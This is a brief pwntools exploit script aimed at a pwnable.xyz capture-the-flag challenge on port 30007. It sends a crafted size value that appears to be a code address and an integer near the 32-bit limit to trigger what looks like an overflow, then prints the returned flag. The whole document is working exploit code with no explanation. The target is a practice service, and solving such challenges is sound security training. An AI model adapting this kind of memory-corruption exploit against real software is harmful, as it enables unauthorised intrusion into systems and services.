from pwn import *

p = remote('svc.pwnable.xyz', 30007)
context.log_level = "debug"

p.sendlineafter('>', '1')
p.sendlineafter('Size:', str(0x400a31))
p.sendlineafter('>', str(0xffffffff-2+1))
print p.recvuntil('}')